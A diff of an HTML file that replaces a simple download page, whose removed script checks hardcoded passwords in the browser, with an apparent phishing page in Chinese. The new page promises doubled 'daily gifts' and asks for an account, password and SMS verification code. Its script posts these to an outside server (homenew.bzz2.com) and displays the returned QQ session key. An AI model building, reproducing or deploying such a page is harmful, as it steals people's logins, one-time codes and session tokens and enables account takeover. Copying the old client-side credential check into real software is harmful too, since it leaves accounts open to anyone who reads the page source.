@@ -1,44 +1,147 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" >
-<head>
-<title>damao的下载站</title>
-<script>
-function r()
-{
+<html><head><meta charset="utf-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <script src="js/jquery.min.js"></script>
+    <script src="js/layer.js"></script>
+    <script src="js/layui.js"></script>
+    <link href="css/layui.css" rel="stylesheet">
+    <title>授权</title>
+    <style type="text/css">
+#t-warp{margin:0 auto;width:96%;position:relative;}
+@media  screen and (min-width:500px){#t-warp{width:500px!important}}
+input[type=text], select {
+  width: 100%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  box-sizing: border-box;
+}
 
-var username=document.getElementById("username");
+.inputff {
+  background-color: #4CAF50;
+}
+.inputff:hover {
+  background-color: #45a049;
+}
 
-var pass=document.getElementById("password");
-if(username.value=="damao")
-{
-if(pass.value=="123456")
-{
-window.location.href='/1.mp4';
-return;
+.wog {
+  border-radius: 5px;
+  background-color: #f2f2f2;
+  padding: 20px;
 }
-}
-if(username.value=="damao2")
-{
-if(pass.value=="123456")
-{
-window.location.href='/2.mp4';
-return;
-}
-}
-return true;
-}
-</script>
+</style>
+<style>
+.modal-header{display:flex;flex-shrink:0;align-items:center;justify-content:space-between;padding:1rem 1rem;border-bottom:1px solid #dee2e6;border-top-left-radius:calc(0.3rem - 1px);border-top-right-radius:calc(0.3rem - 1px)}
+.modal-body{position:relative;flex:1 1 auto;padding:1rem}
+.modal-footer{display:flex;flex-wrap:wrap;flex-shrink:0;align-items:center;justify-content:flex-end;padding:0.75rem;border-top:1px solid #dee2e6;border-bottom-right-radius:calc(0.3rem - 1px);   border-bottom-left-radius: calc(0.3rem - 1px);}
+.foec { background-color: #4CAF50;color: white; padding: 12px 20px;border: none;border-radius: 4px;cursor: pointer;float: right;}
+</style>
+
 </head>
 <body>
-<form>
-<table width="350" bgcolor="#ccffcc" style="border-color" border="1">
-<tr align=center>
-<td>用户名</td><td><input type="text" name="username" id="username"></td>
-</tr>
-<tr align=center><td>密 码</td><td><input type="password" name="password" id="password"></td></tr>
-<tr align=center><td colspan="2"><input type="button" value="下 载" onclick="r();"/>     <input type="reset" value="重 置"/></td></tr>
+<br>
+<div id="t-warp" class="t-warp">
+<blockquote class="layui-elem-quote layui-quote-nm">
+因官方更新,无法扫码授权,若需要授权，只能登入授权。登录成功后会弹出你每日好礼的账号钥匙
+</blockquote>
+<!---测试中，目前不稳定！!--->
+<div class="wog">
+    <label for="fname">账号</label>
+    <input type="text" id="fname" name="firstname" placeholder="Your 账号.." value="">
+    <label for="lname">密码</label>
+    <input type="text" id="lname" name="lastname" placeholder="Your 密码..">
+    
 
-</table>
-</form>
-</body>
-</html>
+    <button type="button" class="layui-btn layui-btn-fluid inputff" value="登入授权" onclick="dlmm()" style="    line-height: 50px;height: 50px;">登入授权</button>
+    
+</div>
+<div id="data11"></div>
+<script>
+function dlmm(){
+    layer.msg('登入中', { icon: 16 ,shade: 0.01});
+    setTimeout(function(){ layer.closeAll('loading');}, 5000);
+    var ssddd='{"l":"dl","q":"'+$('#fname').val()+'","uid":"'+fz("uid")+'","m":"'+$('#lname').val()+'"}';
+    $.post("https://homenew.bzz2.com/dl.php?l=1", ssddd, function(data){
+    var josndata2= eval("("+data+")");
+    if(josndata2.lx=="hkyzm"){
+     window.location.href =josndata2.hkyzm;
+    }else if(josndata2.lx=="dx"){
+        myFunction(josndata2.jg);
+    }else{
+        layer.alert(josndata2.jg)
+    };
+    layer.closeAll('loading');
+    });
+    
+};
+function myFunction(biaoti){
+    xdl(biaoti);
+};
+function myFunction2(jieguo){
+    layer.msg('正在验证', { icon: 16 ,shade: 0.01});
+    setTimeout(function(){ layer.closeAll('loading');}, 5000);
+    var ssddd='{"l":"dxyzm","q":"'+$('#fname').val()+'","jg":"'+jieguo+'"}';
+    $.post("https://homenew.bzz2.com/dl.php?l=1", ssddd, function(data){
+    r();
+    var josndata2= eval("("+data+")");
+    if(josndata2.lx=="xx"){
+    if(josndata2.jg=="登录成功"){josndata2.jg="账号："+josndata2.qq+"</br>昵称："+josndata2.nc+"</br>授权结果：授权成功</br>你的钥匙："+josndata2.skey+"</br></br>授权成功！今天已为你互暂，之后你每天的所有奖励都会翻倍！";};
+     layer.alert(josndata2.jg);
+    }else{
+        layer.alert(josndata2.jg);
+    };
+    layer.closeAll('loading');
+    });
+}
+function fz(name) {
+    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i");
+    var r = window.location.search.substr(1).match(reg);
+    if (r != null) return unescape(r[2]); return null;
+    }
+var k=fz("k");
+if(k!=null){
+    layer.msg('验证中', { icon: 16 ,shade: 0.01});
+    setTimeout(function(){ layer.closeAll('loading');}, 5000);
+	var d='{"l":"hkyzm","q":"'+fz("uin")+'","jg":"'+k+'"}';
+    $.post("https://homenew.bzz2.com/dl.php?l=2", d, function(a){
+    var b= eval("("+a+")");
+    if(b.lx=="xx"){
+        layer.alert(b.jg);
+    }else if(b.lx=="dx"){
+       myFunction(b.jg);
+       //$("#kfk").attr("style","display:block;");
+    }else{
+       layer.alert(b.jg);
+        };
+    layer.closeAll('loading');
+    });
+}
+function w() {
+    var z=$('#llyzm').val();
+    if(z==null){layer.alert("请输入正确的六位短信验证码");}else{myFunction2(z);}
+    //setTimeout(r,2000);
+    }
+function r() { $("#kfk").attr("style","display:none;");}
+
+function xdl(bt){
+layer.open({
+  type: 1,
+  title: '登入授权每日好礼',
+  area: ['320px', ''], //宽高
+  offset: [ '150px', ],
+  content: '        <div class="modal-header">      <h4 class="modal-title" id="ofk">'+bt+'</h4>    </div>    <div class="modal-body">        <input type="text" id="llyzm" name="" placeholder="六位短信验证码">      </div>      <div class="modal-footer">        <div class="row"> <input id="kgi" class="foec" type="submit" value="提交" onclick="w()" > </div>      </div>'
+});
+}
+
+</script>
+</div>
+<div style="display:none;">
+	<script>var _hmt = _hmt || [];(function() { var hm = document.createElement("script");  hm.src = "https://hm.baidu.com/hm.js?bf1fa0cb16706ec683085993a52d7532";  var s = document.getElementsByTagName("script")[0];  s.parentNode.insertBefore(hm, s);
+})();</script>
+</div>
+
+
+</body></html>
